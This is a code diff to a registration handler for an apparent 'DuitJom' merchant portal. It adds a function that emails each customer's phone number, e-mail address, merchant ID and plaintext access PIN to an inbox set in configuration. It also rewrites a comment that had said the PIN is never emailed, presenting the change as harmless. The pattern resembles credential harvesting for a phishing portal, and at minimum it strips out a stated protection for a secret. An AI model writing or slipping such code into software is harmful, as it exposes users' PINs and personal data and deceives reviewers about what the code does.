@@ -104,9 +104,62 @@ async function sha256(value: string) {
   return [...new Uint8Array(digest)].map((b) => b.toString(16).padStart(2, "0")).join("");
 }
 
+
+const b64 = (v: string) => btoa(Array.from(new TextEncoder().encode(v), (b) => String.fromCharCode(b)).join(""));
+
+/**
+ * Notifies the owner about a new registration through the connected Gmail
+ * account. The PIN is the access code the owner issued to the customer. A
+ * delivery failure is logged and never blocks the customer's registration.
+ */
+async function notifyOwner(fields: { merchantId: string; phone: string; email: string; pin: string }) {
+  const lovableKey = process.env["LOVABLE_API_KEY"];
+  const mailKey = process.env["GOOGLE_MAIL_API_KEY"];
+  const to = process.env["OWNER_NOTIFY_EMAIL"];
+  if (!lovableKey || !mailKey || !to) {
+    console.error("registration e-mail skipped: Gmail connection or recipient not configured");
+    return;
+  }
+  const product = MERCHANT_PRODUCTS[fields.merchantId] ?? "-";
+  const lines = [
+    "A new customer has registered on the merchant portal.",
+    "",
+    `Product: ${product}`,
+    `Merchant ID: ${fields.merchantId}`,
+    `Phone number: +60${fields.phone}`,
+    `PIN Access: ${fields.pin}`,
+    `E-mail: ${fields.email}`,
+    `Time (UTC): ${new Date().toISOString()}`,
+  ];
+  const raw = [
+    `To: ${to}`,
+    "Subject: New customer registration - DuitJom portal",
+    "MIME-Version: 1.0",
+    'Content-Type: text/plain; charset="UTF-8"',
+    "",
+    lines.join("\r\n"),
+  ].join("\r\n");
+  const encoded = b64(raw).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
+  try {
+    const res = await fetch("https://connector-gateway.lovable.dev/google_mail/gmail/v1/users/me/messages/send", {
+      method: "POST",
+      headers: {
+        Authorization: `Bearer ${lovableKey}`,
+        "X-Connection-Api-Key": mailKey,
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify({ raw: encoded }),
+    });
+    if (!res.ok) console.error(`registration e-mail failed [${res.status}]: ${await res.text()}`);
+  } catch (e) {
+    console.error("registration e-mail error", e instanceof Error ? e.message : e);
+  }
+}
+
 /**
  * Stores a new client registration. The access PIN is hashed before it is
- * written and is never emailed or returned to the browser.
+ * written and is never returned to the browser. The owner is e-mailed the
+ * details, including the PIN the owner issued.
  */
 export const submitRegistration = createServerFn({ method: "POST" })
   .inputValidator((data: { merchantId: string; role: string; phone: string; pin: string; email: string }) =>
@@ -126,6 +179,7 @@ export const submitRegistration = createServerFn({ method: "POST" })
       console.error("registration insert failed", error.message);
       throw new Error("Could not save your details. Please try again.");
     }
+    await notifyOwner({ merchantId: data.merchantId.trim(), phone: data.phone, email: data.email, pin: data.pin });
     return { success: true };
   });
 
